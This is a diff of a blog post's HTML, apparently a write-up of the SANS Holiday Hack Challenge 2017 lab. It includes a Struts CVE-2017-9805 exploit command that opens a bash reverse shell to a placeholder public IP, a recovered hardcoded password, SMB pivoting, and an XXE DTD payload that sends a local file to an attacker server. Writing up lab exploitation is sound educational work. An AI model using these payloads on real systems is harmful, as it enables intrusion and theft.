-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;!-- Development version --&gt;
-    &lt;a href=&#34;http://dev.northpolechristmastown.com&#34; style=&#34;display: none;&#34;&gt;Access Development Version&lt;/a&gt;</code></pre>
-</div>
+
+<pre><code class="language-php">&lt;!-- Development version --&gt;
+    &lt;a href=&quot;http://dev.northpolechristmastown.com&quot; style=&quot;display: none;&quot;&gt;Access Development Version&lt;/a&gt;
+</code></pre>
+
 <p>Proceed to the site above and read the source code, I encountered another interesting information about the backend component of this application</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">    &lt;div id=&#34;the-footer&#34;&gt;&lt;p class=&#34;center-it&#34;&gt;Powered By: &lt;a href=&#34;https://struts.apache.org/&#34;&gt;Apache Struts&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
-    &lt;!-- Friend over at Equal-facts Inc recommended this framework--&gt;</code></pre>
-</div>
+
+<pre><code class="language-php">    &lt;div id=&quot;the-footer&quot;&gt;&lt;p class=&quot;center-it&quot;&gt;Powered By: &lt;a href=&quot;https://struts.apache.org/&quot;&gt;Apache Struts&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+    &lt;!-- Friend over at Equal-facts Inc recommended this framework--&gt;
+</code></pre>
+
 <p>So there is a chance that the application uses Apache Struts and the exploit is related to the Equifax Hack.</p>
 
 <blockquote>
@@ -592,22 +797,28 @@ This is a 64-bit machine, so we need to find the linker at <code>/lib64/ld-linux
 
 <p>In order to get a reverse shell, I need to have a public IP address.
 On Kali box:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">nc -lvp </span><span style="color:#ae81ff">443</span></code></pre>
-</div>
+
+<pre><code class="language-bash">nc -lvp 443
+</code></pre>
+
 <p>To exploit:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders/542 -c </span><span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/&lt;public-ip-goes-here&gt;/443 0&gt;&amp;1&#34;</span></code></pre>
-</div>
+
+<pre><code class="language-bash">python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders/542 -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;public-ip-goes-here&gt;/443 0&gt;&amp;1&quot;
+</code></pre>
+
 <p>It took me a long time after getting the shell to find the password because I overlooked the result coming from grep and things doesn&rsquo;t work well over this netcat shell. I decided to setup persistence and upgraded my shell using msfvenom reverse_tcp shell.</p>
 
 <p>While trying to get Alabaster Snowball&rsquo;s password, the only place I can think of to have password is the tomcat manager. The application is located in <code>/opt/apache-tomcat</code>. I looked into <code>tomcat_users.xml</code> but no luck. After a few hours trying to grep with keywords like <code>pass, password, alabaster</code>, I was able to find the password in <code>apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span><span style=""> </span><span style="color:#66d9ef">class</span><span style=""> </span><span style="color:#a6e22e">Connect</span><span style=""> </span><span style="color:#f92672">{</span><span style="">
-</span><span style="">            </span><span style="color:#66d9ef">final</span><span style=""> </span><span style="">String</span><span style=""> </span><span style="">host</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74">&#34;localhost&#34;</span><span style="color:#f92672">;</span><span style="">
-</span><span style="">            </span><span style="color:#66d9ef">final</span><span style=""> </span><span style="">String</span><span style=""> </span><span style="">username</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74">&#34;alabaster_snowball&#34;</span><span style="color:#f92672">;</span><span style="">
-</span><span style="">            </span><span style="color:#66d9ef">final</span><span style=""> </span><span style="">String</span><span style=""> </span><span style="">password</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74">&#34;stream_unhappy_buy_loss&#34;</span><span style="color:#f92672">;</span><span style="">   
-</span><span style="">            </span><span style="">String</span><span style=""> </span><span style="">connectionURL</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74">&#34;jdbc:mysql://&#34;</span><span style=""> </span><span style="color:#f92672">+</span><span style=""> </span><span style="">host</span><span style=""> </span><span style="color:#f92672">+</span><span style=""> </span><span style="color:#e6db74">&#34;:3306/db?user=;password=&#34;</span><span style="color:#f92672">;</span><span style="">
-</span><span style="">            </span><span style="">Connection</span><span style=""> </span><span style="">connection</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#66d9ef">null</span><span style="color:#f92672">;</span><span style="">
-</span><span style="">            </span><span style="">Statement</span><span style=""> </span><span style="">statement</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#66d9ef">null</span><span style="color:#f92672">;</span></code></pre>
-</div>
+
+<pre><code class="language-java">public class Connect {
+            final String host = &quot;localhost&quot;;
+            final String username = &quot;alabaster_snowball&quot;;
+            final String password = &quot;stream_unhappy_buy_loss&quot;;   
+            String connectionURL = &quot;jdbc:mysql://&quot; + host + &quot;:3306/db?user=;password=&quot;;
+            Connection connection = null;
+            Statement statement = null;
+</code></pre>
+
 <p>Password: <code>stream_unhappy_buy_loss</code></p>
 
 <p>Note on this part:</p>
@@ -632,59 +843,67 @@ On Kali box:</p>
 <p>I made a mistake on this part, which took me a while to figure out the correct smb server. I read over the hint about host discovery and did a normal nmap scan, which is sure to miss the correct smb server.</p>
 
 <p>The right way to do the nmap was:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">nmap -v -PS445 </span><span style="color:#ae81ff">10</span><span style="">.142.0.0/24
-</span><span style="">
-</span><span style="">Nmap scan report </span><span style="color:#66d9ef">for</span><span style=""> hhc17-smb-server.c.holidayhack2017.internal </span><span style="color:#f92672">(</span><span style="color:#ae81ff">10</span><span style="">.142.0.7</span><span style="color:#f92672">)</span><span style="">
-</span><span style="">Host is up </span><span style="color:#f92672">(</span><span style="color:#ae81ff">0</span><span style="">.00056s latency</span><span style="color:#f92672">)</span><span style="">.
-</span><span style="">Not shown: </span><span style="color:#ae81ff">996</span><span style=""> filtered ports
-</span><span style="">PORT     STATE SERVICE
-</span><span style=""></span><span style="color:#ae81ff">135</span><span style="">/tcp  open  msrpc
-</span><span style=""></span><span style="color:#ae81ff">139</span><span style="">/tcp  open  netbios-ssn
-</span><span style=""></span><span style="color:#ae81ff">445</span><span style="">/tcp  open  microsoft-ds
-</span><span style=""></span><span style="color:#ae81ff">3389</span><span style="">/tcp open  ms-wbt-server
-</span><span style="">
-</span><span style="">Nmap scan report </span><span style="color:#66d9ef">for</span><span style=""> hhc17-emi.c.holidayhack2017.internal </span><span style="color:#f92672">(</span><span style="color:#ae81ff">10</span><span style="">.142.0.8</span><span style="color:#f92672">)</span><span style="">
-</span><span style="">Host is up </span><span style="color:#f92672">(</span><span style="color:#ae81ff">0</span><span style="">.00018s latency</span><span style="color:#f92672">)</span><span style="">.
-</span><span style="">Not shown: </span><span style="color:#ae81ff">995</span><span style=""> closed ports
-</span><span style="">PORT     STATE SERVICE
-</span><span style=""></span><span style="color:#ae81ff">80</span><span style="">/tcp   open  http
-</span><span style=""></span><span style="color:#ae81ff">135</span><span style="">/tcp  open  msrpc
-</span><span style=""></span><span style="color:#ae81ff">139</span><span style="">/tcp  open  netbios-ssn
-</span><span style=""></span><span style="color:#ae81ff">445</span><span style="">/tcp  open  microsoft-ds
-</span><span style=""></span><span style="color:#ae81ff">3389</span><span style="">/tcp open  ms-wbt-server</span></code></pre>
-</div>
+
+<pre><code class="language-bash">nmap -v -PS445 10.142.0.0/24
+
+Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
+Host is up (0.00056s latency).
+Not shown: 996 filtered ports
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
+Host is up (0.00018s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+</code></pre>
+
 <p>The correct smb server is <code>10.142.0.7</code>. Since the victim machine (in #2) doesn&rsquo;t have smbclient on it, I need to setup a SSH port forward so that I can access the share from my kali box.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">ssh -L </span><span style="color:#ae81ff">445</span><span style="">:10.142.0.7:445 alabaster_snowball@dev.northpolechristmastown.com</span></code></pre>
-</div>
+
+<pre><code class="language-bash">ssh -L 445:10.142.0.7:445 alabaster_snowball@dev.northpolechristmastown.com
+</code></pre>
+
 <p>I am then able to list the shares.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">smbclient -L </span><span style="color:#ae81ff">127</span><span style="">.0.0.1 -U alabaster_snowball
-</span><span style="">WARNING: The </span><span style="color:#e6db74">&#34;syslog&#34;</span><span style=""> option is deprecated
-</span><span style="">Enter WORKGROUP</span><span style="color:#ae81ff">\a</span><span style="">labaster_snowball</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="">s password:
-</span><span style="">
-</span><span style="">        Sharename       Type      Comment
-</span><span style="">        ---------       ----      -------
-</span><span style="">        ADMIN$          Disk      Remote Admin
-</span><span style="">        C$              Disk      Default share
-</span><span style="">        FileStor        Disk
-</span><span style="">        IPC$            IPC       Remote IPC
-</span><span style="">Reconnecting with SMB1 </span><span style="color:#66d9ef">for</span><span style=""> workgroup listing.
-</span><span style="">Connection to </span><span style="color:#ae81ff">127</span><span style="">.0.01 failed </span><span style="color:#f92672">(</span><span style="">Error NT_STATUS_CONNECTION_REFUSED</span><span style="color:#f92672">)</span><span style="">
-</span><span style="">Failed to connect with SMB1 -- no workgroup available</span></code></pre>
-</div>
+
+<pre><code class="language-bash">smbclient -L 127.0.0.1 -U alabaster_snowball
+WARNING: The &quot;syslog&quot; option is deprecated
+Enter WORKGROUP\alabaster_snowball's password:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        FileStor        Disk
+        IPC$            IPC       Remote IPC
+Reconnecting with SMB1 for workgroup listing.
+Connection to 127.0.01 failed (Error NT_STATUS_CONNECTION_REFUSED)
+Failed to connect with SMB1 -- no workgroup available
+</code></pre>
+
 <p>The files are stored in <code>FileStor</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">smbclient </span><span style="color:#ae81ff">\\\\</span><span style="color:#ae81ff">127</span><span style="">.0.0.1</span><span style="color:#ae81ff">\\</span><span style="">FileStor -U alabaster_snowball
-</span><span style="">
-</span><span style="">smb: </span><span style="color:#ae81ff">\&gt;</span><span style=""> ls
-</span><span style="">  .                                   D        </span><span style="color:#ae81ff">0</span><span style="">  Mon Jan  </span><span style="color:#ae81ff">8</span><span style=""> </span><span style="color:#ae81ff">14</span><span style="">:31:53 </span><span style="color:#ae81ff">2018</span><span style="">
-</span><span style="">  ..                                  D        </span><span style="color:#ae81ff">0</span><span style="">  Mon Jan  </span><span style="color:#ae81ff">8</span><span style=""> </span><span style="color:#ae81ff">14</span><span style="">:31:53 </span><span style="color:#ae81ff">2018</span><span style="">
-</span><span style="">  BOLO - Munchkin Mole Report.docx      A   </span><span style="color:#ae81ff">255520</span><span style="">  Wed Dec  </span><span style="color:#ae81ff">6</span><span style=""> </span><span style="color:#ae81ff">21</span><span style="">:44:17 </span><span style="color:#ae81ff">2017</span><span style="">
-</span><span style="">  GreatBookPage3.pdf                  A  </span><span style="color:#ae81ff">1275756</span><span style="">  Mon Dec  </span><span style="color:#ae81ff">4</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:21:44 </span><span style="color:#ae81ff">2017</span><span style="">
-</span><span style="">  MEMO - Password Policy Reminder.docx      A   </span><span style="color:#ae81ff">133295</span><span style="">  Wed Dec  </span><span style="color:#ae81ff">6</span><span style=""> </span><span style="color:#ae81ff">21</span><span style="">:47:28 </span><span style="color:#ae81ff">2017</span><span style="">
-</span><span style="">  Naughty and Nice List.csv           A    </span><span style="color:#ae81ff">10245</span><span style="">  Thu Nov </span><span style="color:#ae81ff">30</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:42:00 </span><span style="color:#ae81ff">2017</span><span style="">
-</span><span style="">  Naughty and Nice List.docx          A    </span><span style="color:#ae81ff">60344</span><span style="">  Wed Dec  </span><span style="color:#ae81ff">6</span><span style=""> </span><span style="color:#ae81ff">21</span><span style="">:51:25 </span><span style="color:#ae81ff">2017</span><span style="">
-</span><span style="">
-</span><span style="">                </span><span style="color:#ae81ff">13106687</span><span style=""> blocks of size </span><span style="color:#ae81ff">4096</span><span style="">. </span><span style="color:#ae81ff">9624205</span><span style=""> </span></code></pre>
-</div>
+
+<pre><code class="language-bash">smbclient \\\\127.0.0.1\\FileStor -U alabaster_snowball
+
+smb: \&gt; ls
+  .                                   D        0  Mon Jan  8 14:31:53 2018
+  ..                                  D        0  Mon Jan  8 14:31:53 2018
+  BOLO - Munchkin Mole Report.docx      A   255520  Wed Dec  6 21:44:17 2017
+  GreatBookPage3.pdf                  A  1275756  Mon Dec  4 19:21:44 2017
+  MEMO - Password Policy Reminder.docx      A   133295  Wed Dec  6 21:47:28 2017
+  Naughty and Nice List.csv           A    10245  Thu Nov 30 19:42:00 2017
+  Naughty and Nice List.docx          A    60344  Wed Dec  6 21:51:25 2017
+
+                13106687 blocks of size 4096. 9624205 
+</code></pre>
+
 <p><em>4. Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at <a href="http://mail.northpolechristmastown.com">http://mail.northpolechristmastown.com</a>. What can you learn from The Great Book page found in an e-mail on that server?</em></p>
 
 <p><em>Pepper Minstix provides some hints for this challenge on the There&rsquo;s Snow Place Like Home Level.</em></p>
@@ -692,45 +911,49 @@ On Kali box:</p>
 <p>I didn&rsquo;t finish this one. However, I did found interesting stuffs.</p>
 
 <p>According to the hints, there is something to do with hiding things from search engines. I then proceeded to check out <code>robots.txt</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">User-agent: *
-</span><span style="">Disallow: /cookie.txt</span></code></pre>
-</div>
+
+<pre><code class="language-bash">User-agent: *
+Disallow: /cookie.txt
+</code></pre>
+
 <p><code>cookie.txt</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style=""></span><span style="color:#75715e">//FOUND THESE FOR creating and validating cookies. Going to use this in node js
-</span><span style="color:#75715e"></span><span style="">    </span><span style="color:#66d9ef">function</span><span style=""> </span><span style="color:#a6e22e">cookie_maker</span><span style="">(</span><span style="color:#a6e22e">username</span><span style="">,</span><span style=""> </span><span style="color:#a6e22e">callback</span><span style="">){</span><span style="">
-</span><span style="">        </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">key</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74">&#39;need to put any length key in here&#39;</span><span style="">;</span><span style="">
-</span><span style="">        </span><span style="color:#75715e">//randomly generates a string of 5 characters
-</span><span style="color:#75715e"></span><span style="">        </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">plaintext</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#a6e22e">rando_string</span><span style="">(</span><span style="color:#ae81ff">5</span><span style="">)</span><span style="">
-</span><span style="">        </span><span style="color:#75715e">//makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters
-</span><span style="color:#75715e"></span><span style="">        </span><span style="color:#75715e">//Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out.
-</span><span style="color:#75715e"></span><span style="">        </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">ciphertext</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#a6e22e">aes256</span><span style="">.</span><span style="color:#a6e22e">encrypt</span><span style="">(</span><span style="color:#a6e22e">key</span><span style="">,</span><span style=""> </span><span style="color:#a6e22e">plaintext</span><span style="">).</span><span style="color:#a6e22e">replace</span><span style="">(</span><span style="color:#e6db74">/\=/g</span><span style="">,</span><span style="color:#e6db74">&#39;&#39;</span><span style="">);</span><span style="">
-</span><span style="">        </span><span style="color:#75715e">//Setting the values of the cookie.
-</span><span style="color:#75715e"></span><span style="">        </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">acookie</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="">[</span><span style="color:#e6db74">&#39;IOTECHWEBMAIL&#39;</span><span style="">,</span><span style="color:#a6e22e">JSON</span><span style="">.</span><span style="color:#a6e22e">stringify</span><span style="">({</span><span style="color:#e6db74">&#34;name&#34;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">username</span><span style="">,</span><span style=""> </span><span style="color:#e6db74">&#34;plaintext&#34;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">plaintext</span><span style="">,</span><span style="">  </span><span style="color:#e6db74">&#34;ciphertext&#34;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">ciphertext</span><span style="">}),</span><span style=""> </span><span style="">{</span><span style=""> </span><span style="color:#a6e22e">maxAge</span><span style="color:#f92672">:</span><span style=""> </span><span style="color:#ae81ff">86400000</span><span style="">,</span><span style=""> </span><span style="color:#a6e22e">httpOnly</span><span style="color:#f92672">:</span><span style=""> </span><span style="color:#66d9ef">true</span><span style="">,</span><span style=""> </span><span style="color:#a6e22e">encode</span><span style="color:#f92672">:</span><span style=""> </span><span style="">String</span><span style=""> </span><span style="">}]</span><span style="">
-</span><span style="">        </span><span style="color:#66d9ef">return</span><span style=""> </span><span style="color:#a6e22e">callback</span><span style="">(</span><span style="color:#a6e22e">acookie</span><span style="">);</span><span style="">
-</span><span style="">    </span><span style="">};</span><span style="">
-</span><span style="">    </span><span style="color:#66d9ef">function</span><span style=""> </span><span style="color:#a6e22e">cookie_checker</span><span style="">(</span><span style="color:#a6e22e">req</span><span style="">,</span><span style=""> </span><span style="color:#a6e22e">callback</span><span style="">){</span><span style="">
-</span><span style="">        </span><span style="color:#66d9ef">try</span><span style="">{</span><span style="">
-</span><span style="">            </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">key</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74">&#39;need to put any length key in here&#39;</span><span style="">;</span><span style="">
-</span><span style="">            </span><span style="color:#75715e">//Retrieving the cookie from the request headers and parsing it as JSON
-</span><span style="color:#75715e"></span><span style="">            </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">thecookie</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#a6e22e">JSON</span><span style="">.</span><span style="color:#a6e22e">parse</span><span style="">(</span><span style="color:#a6e22e">req</span><span style="">.</span><span style="color:#a6e22e">cookies</span><span style="">.</span><span style="color:#a6e22e">IOTECHWEBMAIL</span><span style="">);</span><span style="">
-</span><span style="">            </span><span style="color:#75715e">//Retrieving the cipher text 
-</span><span style="color:#75715e"></span><span style="">            </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">ciphertext</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#a6e22e">thecookie</span><span style="">.</span><span style="color:#a6e22e">ciphertext</span><span style="">;</span><span style="">
-</span><span style="">            </span><span style="color:#75715e">//Retrievingin the username
-</span><span style="color:#75715e"></span><span style="">            </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">username</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#a6e22e">thecookie</span><span style="">.</span><span style="color:#a6e22e">name</span><span style="">
-</span><span style="">            </span><span style="color:#75715e">//retrieving the plaintext
-</span><span style="color:#75715e"></span><span style="">            </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">plaintext</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#a6e22e">aes256</span><span style="">.</span><span style="color:#a6e22e">decrypt</span><span style="">(</span><span style="color:#a6e22e">key</span><span style="">,</span><span style=""> </span><span style="color:#a6e22e">ciphertext</span><span style="">);</span><span style="">
-</span><span style="">            </span><span style="color:#75715e">//If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key
-</span><span style="color:#75715e"></span><span style="">            </span><span style="color:#66d9ef">if</span><span style=""> </span><span style="">(</span><span style="color:#a6e22e">plaintext</span><span style=""> </span><span style="color:#f92672">===</span><span style=""> </span><span style="color:#a6e22e">thecookie</span><span style="">.</span><span style="color:#a6e22e">plaintext</span><span style="">)</span><span style=""> </span><span style="">{</span><span style="">
-</span><span style="">                </span><span style="color:#66d9ef">return</span><span style=""> </span><span style="color:#a6e22e">callback</span><span style="">(</span><span style="color:#66d9ef">true</span><span style="">,</span><span style=""> </span><span style="color:#a6e22e">username</span><span style="">);</span><span style="">
-</span><span style="">            </span><span style="">}</span><span style=""> </span><span style="color:#66d9ef">else</span><span style=""> </span><span style="">{</span><span style="">
-</span><span style="">                </span><span style="color:#66d9ef">return</span><span style=""> </span><span style="color:#a6e22e">callback</span><span style="">(</span><span style="color:#66d9ef">false</span><span style="">,</span><span style=""> </span><span style="color:#e6db74">&#39;&#39;</span><span style="">);</span><span style="">
-</span><span style="">            </span><span style="">}</span><span style="">
-</span><span style="">        </span><span style="">}</span><span style=""> </span><span style="color:#66d9ef">catch</span><span style=""> </span><span style="">(</span><span style="color:#a6e22e">e</span><span style="">)</span><span style=""> </span><span style="">{</span><span style="">
-</span><span style="">            </span><span style="color:#a6e22e">console</span><span style="">.</span><span style="color:#a6e22e">log</span><span style="">(</span><span style="color:#a6e22e">e</span><span style="">);</span><span style="">
-</span><span style="">            </span><span style="color:#66d9ef">return</span><span style=""> </span><span style="color:#a6e22e">callback</span><span style="">(</span><span style="color:#66d9ef">false</span><span style="">,</span><span style=""> </span><span style="color:#e6db74">&#39;&#39;</span><span style="">);</span><span style="">
-</span><span style="">        </span><span style="">}</span><span style="">
-</span><span style="">    </span><span style="">};</span></code></pre>
-</div>
+
+<pre><code class="language-javascript">//FOUND THESE FOR creating and validating cookies. Going to use this in node js
+    function cookie_maker(username, callback){
+        var key = 'need to put any length key in here';
+        //randomly generates a string of 5 characters
+        var plaintext = rando_string(5)
+        //makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters
+        //Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out.
+        var ciphertext = aes256.encrypt(key, plaintext).replace(/\=/g,'');
+        //Setting the values of the cookie.
+        var acookie = ['IOTECHWEBMAIL',JSON.stringify({&quot;name&quot;:username, &quot;plaintext&quot;:plaintext,  &quot;ciphertext&quot;:ciphertext}), { maxAge: 86400000, httpOnly: true, encode: String }]
+        return callback(acookie);
+    };
+    function cookie_checker(req, callback){
+        try{
+            var key = 'need to put any length key in here';
+            //Retrieving the cookie from the request headers and parsing it as JSON
+            var thecookie = JSON.parse(req.cookies.IOTECHWEBMAIL);
+            //Retrieving the cipher text 
+            var ciphertext = thecookie.ciphertext;
+            //Retrievingin the username
+            var username = thecookie.name
+            //retrieving the plaintext
+            var plaintext = aes256.decrypt(key, ciphertext);
+            //If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key
+            if (plaintext === thecookie.plaintext) {
+                return callback(true, username);
+            } else {
+                return callback(false, '');
+            }
+        } catch (e) {
+            console.log(e);
+            return callback(false, '');
+        }
+    };
+</code></pre>
+
 <!-- 5. How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles? Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?
 
 Minty Candycane offers some tips for this challenge in the North Pole and Beyond. -->
@@ -759,34 +982,36 @@ Minty Candycane offers some tips for this challenge in the North Pole and Beyond
 <li><p>A malicious DTD is accessible on my public server:</p>
 
 <p><code>pwn.dtd</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">&lt;?xml </span><span style="">version</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span><span style=""> </span><span style="">encoding</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span><span style="">?&gt;
-</span><span style="">&lt;!ENTITY % stolendata SYSTEM </span><span style="color:#e6db74">&#34;file:///c:/greatbook.txt&#34;</span><span style="">&gt;
-</span><span style="">&lt;!ENTITY % inception </span><span style="color:#e6db74">&#34;&lt;!ENTITY % sendit SYSTEM &#39;http://&lt;public-ip-goes-here&gt;:8000/?%stolendata;&#39;&gt;&#34;</span><span style="">&gt;</span></code></pre>
-</div></li>
+
+<pre><code class="language-bash">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!ENTITY % stolendata SYSTEM &quot;file:///c:/greatbook.txt&quot;&gt;
+&lt;!ENTITY % inception &quot;&lt;!ENTITY &amp;#x25; sendit SYSTEM 'http://&lt;public-ip-goes-here&gt;:8000/?%stolendata;'&gt;&quot;&gt;
+</code></pre></li>
 
 <li><p>The malicious xml file to be uploaded to the application:</p>
 
 <p><code>elfdata.xml</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">&lt;?xml </span><span style="">version</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span><span style=""> </span><span style="">encoding</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span><span style="">?&gt;
-</span><span style="">&lt;!DOCTYPE demo </span><span style="color:#f92672">[</span><span style="">
-</span><span style="">    &lt;!ELEMENT demo ANY &gt;
-</span><span style="">    &lt;!ENTITY % extentity SYSTEM </span><span style="color:#e6db74">&#34;http://&lt;public-ip-goes-here&gt;:8000/pwn.dtd&#34;</span><span style="">&gt;
-</span><span style="">    %extentity</span><span style="">;</span><span style="">
-</span><span style="">    %inception</span><span style="">;</span><span style="">
-</span><span style="">    %sendit</span><span style="">;</span><span style="">
-</span><span style="">    </span><span style="color:#f92672">]</span><span style="">
-</span><span style="">&gt;
-</span><span style="">&lt;Elf&gt;
-</span><span style="">  &lt;Elf&gt;
-</span><span style="">      &lt;ElfID&gt;1&lt;/ElfID&gt;
-</span><span style="">      &lt;ElfName&gt;x64&lt;/ElfName&gt;
-</span><span style="">      &lt;Contact&gt;13371337&lt;/Contact&gt;
-</span><span style="">      &lt;DateOfPurchase&gt;11/29/3017 </span><span style="color:#ae81ff">12</span><span style="">:00:00 AM&lt;/DateOfPurchase&gt;
-</span><span style="">      &lt;Picture&gt;2.png&lt;/Picture&gt;
-</span><span style="">      &lt;Address&gt;here&lt;/Address&gt;
-</span><span style="">  &lt;/Elf&gt;
-</span><span style="">&lt;/Elf&gt;</span></code></pre>
-</div></li>
+
+<pre><code class="language-bash">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE demo [
+    &lt;!ELEMENT demo ANY &gt;
+    &lt;!ENTITY % extentity SYSTEM &quot;http://&lt;public-ip-goes-here&gt;:8000/pwn.dtd&quot;&gt;
+    %extentity;
+    %inception;
+    %sendit;
+    ]
+&gt;
+&lt;Elf&gt;
+  &lt;Elf&gt;
+      &lt;ElfID&gt;1&lt;/ElfID&gt;
+      &lt;ElfName&gt;x64&lt;/ElfName&gt;
+      &lt;Contact&gt;13371337&lt;/Contact&gt;
+      &lt;DateOfPurchase&gt;11/29/3017 12:00:00 AM&lt;/DateOfPurchase&gt;
+      &lt;Picture&gt;2.png&lt;/Picture&gt;
+      &lt;Address&gt;here&lt;/Address&gt;
+  &lt;/Elf&gt;
+&lt;/Elf&gt;
+</code></pre></li>
 </ol>
 
 <p>After uploading the malicious xml file to the application, I was able to see the content of <code>C:\greatbook.txt</code> in my web log on my server:</p>
@@ -825,51 +1050,124 @@ To answer this question, you need to fetch at least five of the seven pages of T
 <li><strong>NEVER HARDCODE YOUR PASSWORD, JUST DON&rsquo;T</strong></li>
 </ol>
 
-			</div>
-			<div id="meta-data">
-				
-				<ul id="tags">
-					Tags:
-					
-					<li><a href="/tags/sans">SANS</a> </li>
-					
-					<li><a href="/tags/hhc">HHC</a> </li>
-					
-				</ul>
-				<p></p>
-				
+              </section>
 
-				
-				<ul id="categories">
-					Topics:
-					
